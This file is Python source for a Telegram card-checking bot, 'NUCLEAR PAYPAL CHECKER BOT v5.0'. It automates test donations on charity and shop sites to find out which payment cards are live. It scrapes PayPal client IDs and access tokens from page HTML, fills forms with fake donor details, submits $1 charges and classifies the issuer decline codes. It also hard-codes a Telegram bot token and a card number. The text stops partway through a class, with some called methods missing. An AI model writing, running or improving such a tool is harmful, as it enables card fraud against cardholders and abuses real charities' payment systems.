# ═══════════════════════════════════════════════════════════
# ⚡ NUCLEAR PAYPAL CHECKER BOT v5.0 - Playwright Edition
# ═══════════════════════════════════════════════════════════

import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64, os, gc, sys, html
from datetime import datetime, timedelta
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import uuid
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══ Playwright ═══
try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False
    print("⚠️ Playwright not installed! Run: pip install playwright && playwright install chromium")

# ═══ UserAgent ═══
try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]
        def random(self):
            return random.choice(self.agents)

# ═══ Premium Emoji ═══
PREMIUM_EMOJI_IDS = {
    "🚀": "5195033767969839232",
    "💎": "6039601162167000043",
    "✅": "6034891730526935918",
    "❌": "6039615816595414817",
    "⚡": "6037229996622225123",
    "💰": "4983539296163070766",
    "🔥": "5424972470023104089",
    "💳": "5445353829304387411",
    "📁": "5431200342636300000",
    "📊": "5431200342636300001",
    "🔍": "5431200342636300002",
    "📝": "5431200342636300003",
    "🔗": "5431200342636300004",
    "💬": "5431200342636300005",
    "🏷️": "5431200342636300006",
    "🔑": "5431200342636300007",
    "🛠️": "5431200342636300008",
    "💯": "5431200342636300009",
    "🚫": "5431200342636300010",
    "⏱": "5382194935057372936",
    "🛑": "6039615816595414817",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        if emoji in result:
            result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

# ═══ Bot Data ═══
token = '8689698569:AAGRy3j9Ln3YXccd05G5I6Otq95yrz_sP60'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

# ═══ Sticker ═══
STICKER_FILE_ID = "CAACAgQAAxkBAAFSqyBqjWmpHuhgREOlQSj30G_1TigB6AACbxsAAjNOgVMDB7_BFdGZtz0E"

# ═══ Test Card ═══
TEST_CARD = "5104040287872188|12|27|951"
TEST_CARD_NUMBER = "5104040287872188"
TEST_CARD_EXPIRY = "20-27-12"
TEST_CARD_CVC = "951"

# ═══ Error Tracking ═══
def track_error(error_type):
    if error_type in error_counter:
        error_counter[error_type] += 1
        if error_counter[error_type] > 10:
            print(f"⚠️ Too many {error_type} errors! Waiting 60s...")
            time.sleep(60)
            error_counter[error_type] = 0

def reset_error_counter():
    for key in error_counter:
        error_counter[key] = 0

# ═══ Safe Send Functions ═══
def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=10):
    for i in range(retries):
        try:
            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=premium_emoji(text), parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time + 5, 65))
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                time.sleep(3 * (i + 1))
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                time.sleep(2 * (i + 1))
            elif "Connection" in error_str or "ConnectionError" in error_str:
                track_error('connection')
                time.sleep(3 * (i + 1))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=10, reply_markup=None):
    for i in range(retries):
        try:
            result = bot.send_message(chat_id, premium_emoji(text), parse_mode=parse_mode, reply_markup=reply_markup)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time + 5, 65))
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                time.sleep(3 * (i + 1))
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                time.sleep(2 * (i + 1))
            elif "Connection" in error_str or "ConnectionError" in error_str:
                track_error('connection')
                time.sleep(3 * (i + 1))
            else:
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=10):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                result = bot.send_document(chat_id, f, caption=premium_emoji(caption), parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time + 5, 65))
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                time.sleep(3 * (i + 1))
            else:
                break
    return None

def safe_get_file(file_id, retries=10):
    for i in range(retries):
        try:
            return bot.get_file(file_id)
        except Exception as e:
            error_str = str(e)
            if "502" in error_str or "Bad Gateway" in error_str:
                time.sleep(5 * (i + 1))
            elif "429" in error_str:
                wait_time = 30
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
                except:
                    pass
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_download_file(file_path, retries=10):
    for i in range(retries):
        try:
            return bot.download_file(file_path)
        except Exception as e:
            error_str = str(e)
            if "502" in error_str or "Bad Gateway" in error_str:
                time.sleep(5 * (i + 1))
            elif "429" in error_str:
                wait_time = 30
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
                except:
                    pass
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

# ═══════════════════════════════════════════════════════════
# ═══ LIVE RESPONSES (PayPal + Stripe + NMI + Braintree + API) ═══
# ═══════════════════════════════════════════════════════════
LIVE_RESPONSES = [
    # ═══ PayPal Standard ═══
    'INSUFFICIENT_FUNDS', 'Payer cannot pay', 'CHARGE 1.0', 'CHARGE 1.00$',
    'RESTRICTED_OR_INACTIVE_ACCOUNT', 'PAYEE_BLOCKED_TRANSACTION',
    'SUSPECTED_FRAUD', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
    'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
    'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'SECURITY_VIOLATION', 'EXPIRED_CARD',
    'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'INVALID_PAYMENT_METHOD',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
    'TRANSACTION_LIMIT_EXCEEDED', 'NOT_ENABLED_FOR_CARD_PROCESSING',
    'CARD_TYPE_NOT_SUPPORTED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'CVV2_FAILURE_INDICATOR',
    'CARD_EXPIRED', 'INVALID_CARD_NUMBER', 'INVALID_EXPIRATION_DATE',
    'CARD_NOT_SUPPORTED', 'AUTHORIZATION_DENIED', 'AUTHORIZATION_EXPIRED',
    'AUTHORIZATION_VOIDED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED',
    
    # ═══ Stripe ═══
    'Your card has insufficient funds',
    'There was an issue with your donation transaction',
    'Your card was declined',
    'Your card was declined.',
    'insufficient_funds',
    'card_declined',
    'transaction_not_allowed',
    'Your card does not support this type of purchase',
    'Your card\'s security code is incorrect',
    'Your card\'s expiration date is incorrect',
    'Your card number is incorrect',
    'Your card has expired',
    'Your card was declined because of insufficient funds',
    'Your card was declined due to insufficient funds',
    'card_error',
    'expired_card',
    'incorrect_cvc',
    'processing_error',
    'card_not_supported',
    'currency_not_supported',
    'do_not_honor',
    'lost_card',
    'stolen_card',
    'pickup_card',
    'restricted_card',
    'security_violation',
    'service_not_allowed',
    'stop_payment_order',
    'testmode_decline',
    'fraudulent',
    'merchant_blacklist',
    'Please check your payment method',
    'contact your card issuer for assistance',
    
    # ═══ NMI ═══
    'Insufficient Funds',
    'Card Declined',
    'Transaction Declined',
    'nmi_declined',
    'nmi_insufficient_funds',
    'Do Not Honor',
    'Invalid Card Number',
    'Invalid CVV',
    'Invalid Expiration',
    'Card Expired',
    'Restricted Card',
    'Call Issuer',
    'Pick Up Card',
    'Lost Card',
    'Stolen Card',
    'Invalid Transaction',
    'Transaction Not Allowed',
    'Card Not Supported',
    'Insufficient Funds Available',
    'Over Limit',
    'Refer to Card Issuer',
    
    # ═══ Braintree (Codes) ═══
    '2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007',
    '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015',
    '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023',
    '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031',
    '2032', '2033', '2034', '2035', '2036', '2037', '2038', '2039',
    '2040', '2041', '2042', '2043', '2044', '2045', '2046', '2047',
    '2048', '2049', '2050', '2051', '2052', '2053', '2054', '2055',
    '2056', '2057', '2058', '2059', '2060', '2061', '2062', '2063',
    '2064', '2065', '2066',
    'braintree_declined',
    
    # ═══ PayPal API (Direct) ═══
    'PAYER_CANNOT_PAY',
    'PAYER_ACTION_REQUIRED',
    'INSTRUMENT_DECLINED',
    'TRANSACTION_REFUSED',
    'PAYMENT_DENIED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYER_BLOCKED_TRANSACTION',
    'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID',
    'ORDER_NOT_APPROVED',
    'PAYEE_BLOCKED_TRANSACTION',
    'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_ACCOUNT_INVALID',
    'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'UNSUPPORTED_INTENT',
    'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'CVV2_FAILURE',
    'CVV2_FAILURE_INDICATOR',
    'CARD_EXPIRED',
    'CARD_TYPE_NOT_SUPPORTED',
    'INVALID_CARD_NUMBER',
    'INVALID_EXPIRATION_DATE',
    'CARD_NOT_SUPPORTED',
    'INVALID_PAYMENT_METHOD',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD',
    'TRANSACTION_LIMIT_EXCEEDED',
    'AUTHORIZATION_DENIED',
    'AUTHORIZATION_EXPIRED',
    'AUTHORIZATION_VOIDED',
    'CAPTURE_FULLY_REFUNDED',
    'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED',
    'REFUND_DENIED',
    'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED',
]

# ═══ DEAD RESPONSES ═══
DEAD_RESPONSES = [
    'DECLINED', 'Create Order Failed', 'Invalid card format',
    'Error:', 'invalid_client', 'Client Authentication failed',
    'invalid_grant', 'unsupported_grant_type', 'invalid_scope',
    'No form fields', 'No au', 'No PayPal data', 'Connection failed',
    'Decode error', 'Invalid URL', 'UserAgent', 'ImportError',
    'Expecting value', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'Playwright not installed', 'Page Load Error', 'Browser Error',
    'INVALID_GATEWAY', 'UNKNOWN_SITE_RESPONSE',
]

# ═══ PAYPAL RESPONSES ═══
PAYPAL_RESPONSES = LIVE_RESPONSES.copy()

# ═══ Playwright Browser Automation Class ═══
class PayPalBrowserAutomation:
    """يفتح الموقع، يدور على زر التبرع، يضغطه، يملأ الفورم، يقبل الشروط، يحدد المبلغ، ويدفع"""
    
    def __init__(self, url, headless=True):
        self.url = url
        self.headless = headless
        self.tokens = {}
        self.html = ""
        self.form_data = {}
        self.errors = []
        self.result = None
        
        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.email = f"{random.choice(self.first_names).lower()}{random.randint(100,999)}@gmail.com"
    
    def get_random_ua(self):
        try:
            return uu.random
        except:
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    
    def run(self, card_number=TEST_CARD_NUMBER, expiry=TEST_CARD_EXPIRY, cvc=TEST_CARD_CVC):
        """تشغيل الأتمتة كاملة"""
        if not HAS_PLAYWRIGHT:
            return "Playwright not installed"
        
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=self.headless,
                    args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
                )
                context = browser.new_context(
                    user_agent=self.get_random_ua(),
                    viewport={'width': 1920, 'height': 1080},
                    ignore_https_errors=True
                )
                page = context.new_page()
                page.set_default_timeout(15000)
                
                # 1. افتح الصفحة
                try:
                    page.goto(self.url, timeout=25000, wait_until='domcontentloaded')
                    page.wait_for_timeout(2000)
                except Exception as e:
                    browser.close()
                    return f"Page Load Error: {str(e)[:80]}"
                
                # 2. استخرج التوكنات من الصفحة
                self.html = page.content()
                self.extract_tokens()
                
                # 3. دور على زر التبرع واضغطه
                self.find_and_click_donate(page)
                page.wait_for_timeout(2000)
                
                # 4. جيب الـ HTML الجديد
                self.html = page.content()
                self.extract_tokens()
                
                # 5. املأ الفورم
                self.fill_form(page)
                page.wait_for_timeout(1000)
                
                # 6. اقبل الشروط
                self.accept_terms(page)
                page.wait_for_timeout(500)
                
                # 7. حدد المبلغ
                self.set_amount(page)
                page.wait_for_timeout(500)
                
                # 8. اضغط زر الدفع
                self.click_pay(page)
                
                # 9. استنى النتيجة
                result = self.wait_for_result(page)
                
                browser.close()
                self.result = result
                return result
                
        except Exception as e:
            return f"Browser Error: {str(e)[:100]}"
    
    def extract_tokens(self):
        """استخراج التوكنات من الصفحة"""
        html = self.html
        
        # Client ID - 13 نمط
        client_id_patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
            r'client_id\s*=\s*["\']([^"\']+)["\']',
            r'merchant-id=["\']([^"\']+)["\']',
            r'data-merchant-id=["\']([^"\']+)["\']',
            r'"merchant_id"\s*:\s*"([^"]+)"',
            r'data-paypal-client-id=["\']([^"\']+)["\']',
            r'paypal-client-id=["\']([^"\']+)["\']',
        ]
        
        for pattern in client_id_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.tokens['client_id'] = match.group(1)
                break
        
        if 'client_id' not in self.tokens:
            script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
            for script in script_matches:
                for pattern in client_id_patterns:
                    match = re.search(pattern, script, re.IGNORECASE)
                    if match:
                        self.tokens['client_id'] = match.group(1)
                        break
                if 'client_id' in self.tokens:
                    break
        
        if 'client_id' not in self.tokens:
            long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
            for string in long_strings:
                if string.startswith(('A', 'B', 'E')):
                    self.tokens['client_id'] = string
                    break
        
        # Client Token + Access Token
        token_patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'"data-client-token"\s*:\s*"([^"]+)"',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']',
            r'clientToken=["\']([^"\']+)["\']',
            r'"clientToken"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.tokens['access_token'] = token_match.group(1)
                        break
                except:
                    pass
                self.tokens['client_token'] = enc
                break
        
        if 'access_token' not in self.tokens:
            access_patterns = [
                r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
                r'"accessToken"\s*:\s*"([^"]+)"',
                r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
                r'accessToken=([^&\s"\']+)',
            ]
            for pattern in access_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    self.tokens['access_token'] = match.group(1)
                    break
        
        # Form Data
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        
        # Ajax URL
        if 'admin-ajax.php' in html:
            self.tokens['ajax_url'] = f'https://{urlparse(self.url).netloc}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.tokens['ajax_url'] = f'https://{urlparse(self.url).netloc}/?wc-ajax=checkout'
    
    def find_and_click_donate(self, page):
        """دور على زر التبرع واضغطه"""
        donate_selectors = [
            'button:has-text("Donate")',
            'button:has-text("Donate Now")',
            'button:has-text("Give")',
            'button:has-text("Give Now")',
            'button:has-text("Support")',
            'a:has-text("Donate")',
            'a:has-text("Donate Now")',
            '[class*="donate"]',
            '[id*="donate"]',
            '[class*="give"]',
            '.give-btn',
        ]
        
        for selector in donate_selectors:
            try:
                element = page.locator(selector).first
                if element.is_visible(timeout=2000):
                    element.click()
                    page.wait_for_timeout(2000)
                    return True
            except:
                continue
        return False
    
    def fill_form(self, page):
        """ملء الفورم تلقائياً"""
        # الاسم الأول
        for selector in ['input[name*="first"]', 'input[id*="first"]', 'input[placeholder*="First"]']:
            try:
                page.fill(selector, random.choice(self.first_names), timeout=1000)
                break
            except:
                continue
        
        # الاسم الأخير
        for selector in ['input[name*="last"]', 'input[id*="last"]', 'input[placeholder*="Last"]']:
            try:
                page.fill(selector, random.choice(self.last_names), timeout=1000)
                break
            except:
                continue
        
        # الإيميل
        for selector in ['input[name*="email"]', 'input[type="email"]', 'input[id*="email"]']:
            try:
                page.fill(selector, self.email, timeout=1000)
                break
            except:
                continue
        
        # العنوان
        for selector in ['input[name*="address"]', 'input[id*="address"]', 'input[placeholder*="Address"]']:
            try:
                page.fill(selector, '123 Main Street', timeout=1000)
                break
            except:
                continue
        
        # المدينة
        for selector in ['input[name*="city"]', 'input[id*="city"]']:
            try:
                page.fill(selector, 'New York', timeout=1000)
                break
            except:
                continue
        
        # ZIP
        for selector in ['input[name*="zip"]', 'input[name*="postal"]', 'input[id*="zip"]']:
            try:
                page.fill(selector, '10001', timeout=1000)
                break
            except:
                continue
        
        # Phone
        for selector in ['input[name*="phone"]', 'input[id*="phone"]']:
            try:
                page.fill(selector, '2125551234', timeout=1000)
                break
            except:
                continue
    
    def accept_terms(self, page):
        """قبول الشروط والأحكام"""
        terms_selectors = [
            'input[type="checkbox"][name*="terms"]',
            'input[type="checkbox"][id*="terms"]',
            'input[type="checkbox"][name*="agree"]',
            'input[type="checkbox"][id*="agree"]',
            'input[type="checkbox"][name*="tos"]',
            '.terms input[type="checkbox"]',
            '.agree input[type="checkbox"]',
            'label:has-text("agree") input[type="checkbox"]',
        ]
        
        for selector in terms_selectors:
            try:
                checkbox = page.locator(selector).first
                if checkbox.is_visible(timeout=1000):
                    if not checkbox.is_checked():
                        checkbox.check()
                    break
            except:
                continue
    
    def set_amount(self, page):
        """تحديد المبلغ"""
        amount = "1.00"
        
        for selector in ['input[name*="amount"]', 'input[id*="amount"]', 'input[placeholder*="amount"]', 'input[type="number"]']:
            try:
                page.fill(selector, amount, timeout=1000)
                return
            except:
                continue
        
        for selector in ['button:has-text("$1")', 'button:has-text("$5")', '[data-amount="1"]', '[data-amount="5"]']:
            try:
                button = page.locator(selector).first
                if button.is_visible(timeout=1000):
                    button.click()
                    return
            except:
                continue
    
    def click_pay(self, page):
        """اضغط زر الدفع"""
        pay_selectors = [
            'button:has-text("Donate")',
            'button:has-text("Pay")',
            'button:has-text("Submit")',
            'button[type="submit"]',
            'input[type="submit"]',
            '[class*="paypal-button"]',
            '.give-submit',
        ]
        
        for selector in pay_selectors:
            try:
                button = page.locator(selector).first
                if button.is_visible(timeout=2000):
                    button.click()
                    page.wait_for_timeout(3000)
                    return
            except:
                continue
    
    def wait_for_result(self, page):
        """استنى الرد من الموقع"""
        try:
            page.wait_for_timeout(12000)
            
            try:
                text = page.inner_text('body')
            except:
                text = ""
            
            html = page.content()
            
            return self.parse_response(text, html)
        except Exception as e:
            return f"Browser Error: {str(e)[:100]}"
    
    def parse_response(self, text, html):
        """استخراج الرد الحقيقي من الموقع"""
        text_lower = text.lower()
        html_lower = html.lower()
        
        # ابحث في JSON embedded
        json_patterns = [
            r'"issue"\s*:\s*"([^"]+)"',
            r'"name"\s*:\s*"([^"]+)"',
            r'"error"\s*:\s*"([^"]+)"',
            r'"message"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in json_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                match_upper = match.upper()
                if any(live.upper() in match_upper for live in LIVE_RESPONSES[:50]):
                    if 'INSUFFICIENT' in match_upper:
                        return "INSUFFICIENT_FUNDS"
                    if 'ORDER_NOT_APPROVED' in match_upper:
                        return "Payer cannot pay for this transaction."
                    return match
        
        # ابحث في النص المرئي
        for live in LIVE_RESPONSES:
            if live.lower() in text_lower:
                if 'insufficient' in live.lower():
                    return "INSUFFICIENT_FUNDS"
                if 'ORDER_NOT_APPROVED' in live:
                    return "Payer cannot pay for this transaction."
                return live
        
        if text.strip():
            clean_text = ' '.join(text.split())[:200]
            return f"Site: {clean_text}"
        
        return "UNKNOWN_SITE_RESPONSE"


# ═══ Request-based Checker (للـ Mass) ═══
class PayPalRequestChecker:
    def __init__(self, target_url):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent() if HAS_FAKE_UA else SimpleUA()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url
        self.url = urlparse(target_url).netloc
        self.inurl = urlparse(target_url).path
        if urlparse(target_url).query:
            self.inurl += f"?{urlparse(target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.html = ""
        self.site_type = "unknown"
        self.buy_now_url = None
        self.returned_data = {}
        self._init_and_extract()
        self._try_all_token_methods()
    
    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            self.html = response.text
            self._extract_client_id(self.html)
            self._extract_form_data(self.html)
            self._extract_ajax_url(self.html)
            self._extract_all_tokens(self.html)
            self._extract_site_type(self.html)
        except:
            pass
    
    def _extract_client_id(self, html):
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
            r'client_id\s*=\s*["\']([^"\']+)["\']',
            r'merchant-id=["\']([^"\']+)["\']',
            r'data-merchant-id=["\']([^"\']+)["\']',
            r'"merchant_id"\s*:\s*"([^"]+)"',
            r'data-paypal-client-id=["\']([^"\']+)["\']',
            r'paypal-client-id=["\']([^"\']+)["\']',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        
        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
        for string in long_strings:
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return
    
    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'token', 'order']):
                self.form_data[attr_name] = attr_value
    
    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
    
    def _extract_all_tokens(self, html):
        patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'"data-client-token"\s*:\s*"([^"]+)"',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']',
            r'clientToken=["\']([^"\']+)["\']',
            r'"clientToken"\s*:\s*"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.access_token = token_match.group(1)
                        return
                except:
                    pass
                self.client_token = enc
                return
        
        direct_patterns = [
            r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"accessToken"\s*:\s*"([^"]+)"',
            r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
            r'accessToken=([^&\s"\']+)',
        ]
        for pattern in direct_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.access_token = match.group(1)
                return
    
    def _extract_site_type(self, html):
        if 'wp-content/plugins/give' in html:
            self.site_type = "givewp"
        elif 'wp-content/plugins/woocommerce' in html:
            self.site_type = "woocommerce"
        elif 'paypal' in html.lower() and 'donate' in html.lower():
            self.site_type = "donation"
        elif 'stripe' in html.lower():
            self.site_type = "stripe"
        elif 'braintree' in html.lower():
            self.site_type = "braintree"
        else:
            self.site_type = "unknown"
    
    def _try_all_token_methods(self):
        if self.access_token:
            return
        if self.client_id:
            token = self._get_oauth_token()
            if token:
                self.access_token = token
                return
        if self.ajax_url:
            token = self._get_client_token_from_site()
            if token:
                self.access_token = token
                return
    
